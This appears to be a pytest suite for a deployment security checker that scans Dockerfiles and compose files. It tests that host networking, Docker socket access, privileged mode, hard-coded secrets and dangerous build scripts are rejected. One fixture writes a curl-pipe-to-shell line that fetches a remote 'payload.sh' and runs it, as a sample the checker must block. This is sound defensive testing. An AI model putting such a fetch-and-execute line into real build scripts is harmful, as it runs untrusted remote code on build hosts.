from pathlib import Path

import pytest

from deployments.common.exceptions import DeploymentSecurityError
from deployments.core.docker_source import (
    analyze_dockerfile,
    analyze_referenced_build_scripts,
    inspect_docker_source,
)


def test_dockerfile_policy_blocks_host_network_and_docker_socket():
    dockerfile = """
FROM alpine:3.20
RUN --network=host echo ok
RUN echo /var/run/docker.sock
"""
    findings = analyze_dockerfile(dockerfile, source_file="Dockerfile")
    codes = {item.code for item in findings}
    assert "dockerfile_host_network" in codes
    assert "dockerfile_dangerous_command" in codes
    assert any(item.action == "deny" for item in findings)


def test_dockerfile_policy_allows_normal_build():
    findings = analyze_dockerfile(
        """
FROM python:3.12-slim
WORKDIR /app
COPY . /app
RUN pip install --no-cache-dir -r requirements.txt
CMD ["python", "app.py"]
""",
        source_file="Dockerfile",
    )
    assert not any(item.action == "deny" for item in findings)


def test_compose_single_service_maps_build_and_strips_host_bind(tmp_path: Path):
    (tmp_path / "docker-compose.yml").write_text(
        """
services:
  web:
    build:
      context: .
      dockerfile: Dockerfile
    ports:
      - "18080:8080"
    volumes:
      - ./host-data:/app/data
      - app-data:/app/persist
    environment:
      APP_ENV: production
""",
        encoding="utf-8",
    )
    (tmp_path / "Dockerfile").write_text(
        """
FROM nginx:alpine
COPY . /usr/share/nginx/html
EXPOSE 8080
""",
        encoding="utf-8",
    )

    result = inspect_docker_source(str(tmp_path))
    assert result.source_kind == "compose"
    assert result.runtime["port"] == 8080
    assert result.runtime["public"] is True
    assert result.runtime["environment"]["APP_ENV"] == "production"
    assert [item["compose_name"] for item in result.volumes] == ["app-data"]
    assert any(item.code == "compose_host_bind_removed" for item in result.findings)
    assert any(item.code == "compose_extra_ports_stripped" for item in result.findings) is False


def test_compose_rejects_multiple_services(tmp_path: Path):
    (tmp_path / "compose.yaml").write_text(
        """
services:
  web:
    image: nginx:alpine
  worker:
    image: alpine:3.20
""",
        encoding="utf-8",
    )
    with pytest.raises(DeploymentSecurityError, match="exactly one application service"):
        inspect_docker_source(str(tmp_path))


def test_compose_rejects_privileged_runtime(tmp_path: Path):
    (tmp_path / "compose.yaml").write_text(
        """
services:
  web:
    image: nginx:alpine
    privileged: true
""",
        encoding="utf-8",
    )
    with pytest.raises(DeploymentSecurityError, match="unsupported 'privileged'"):
        inspect_docker_source(str(tmp_path))


def test_compose_secret_reference_uses_passdeployer_environment(tmp_path: Path):
    (tmp_path / "compose.yaml").write_text(
        """
services:
  web:
    image: nginx:alpine
    environment:
      APP_PASSWORD: ${APP_PASSWORD}
""",
        encoding="utf-8",
    )
    result = inspect_docker_source(
        str(tmp_path),
        environment={"APP_PASSWORD": "runtime-secret"},
    )
    assert result.runtime["environment"]["APP_PASSWORD"] == "runtime-secret"


def test_compose_hardcoded_sensitive_environment_is_rejected(tmp_path: Path):
    (tmp_path / "compose.yaml").write_text(
        """
services:
  web:
    image: nginx:alpine
    environment:
      APP_PASSWORD: hard-coded-secret
""",
        encoding="utf-8",
    )
    with pytest.raises(DeploymentSecurityError, match="Sensitive environment"):
        inspect_docker_source(str(tmp_path))


def test_dockerfile_rejects_device_entitlement():
    findings = analyze_dockerfile(
        "FROM alpine:3.20\nRUN --device=/dev/fuse echo ok\n",
        source_file="Dockerfile",
    )
    assert any(item.code == "dockerfile_device_entitlement" for item in findings)
    assert any(item.action == "deny" for item in findings)


def test_dockerfile_inspects_relative_build_script(tmp_path: Path):
    (tmp_path / "install.sh").write_text(
        "curl https://example.invalid/payload.sh | sh\n",
        encoding="utf-8",
    )
    dockerfile = "FROM alpine:3.20\nCOPY install.sh /tmp/install.sh\nRUN ./install.sh\n"
    findings = analyze_referenced_build_scripts(
        str(tmp_path),
        dockerfile,
        source_file="Dockerfile",
    )
    assert any(item.code == "dockerfile_dangerous_build_script" for item in findings)
    assert any(item.action == "deny" for item in findings)


def test_dockerfile_rejects_uninspectable_absolute_script():
    dockerfile = "FROM alpine:3.20\nRUN /usr/local/bin/install.sh\n"
    findings = analyze_dockerfile(dockerfile, source_file="Dockerfile")
    script_findings = [
        item
        for item in findings
        if item.code == "dockerfile_uninspectable_script"
    ]
    assert script_findings
    assert all(item.action == "deny" for item in script_findings)


def test_compose_rejects_dangerous_relative_build_script(tmp_path: Path):
    (tmp_path / "compose.yaml").write_text(
        """
services:
  web:
    build:
      context: .
      dockerfile: Dockerfile
""",
        encoding="utf-8",
    )
    (tmp_path / "Dockerfile").write_text(
        """
FROM alpine:3.20
COPY build.sh /build.sh
RUN bash build.sh
""",
        encoding="utf-8",
    )
    (tmp_path / "build.sh").write_text(
        """
#!/bin/sh
docker ps
""",
        encoding="utf-8",
    )

    result = inspect_docker_source(str(tmp_path))
    assert result.blocked
    assert any(
        item.code == "dockerfile_dangerous_build_script"
        for item in result.findings
    )
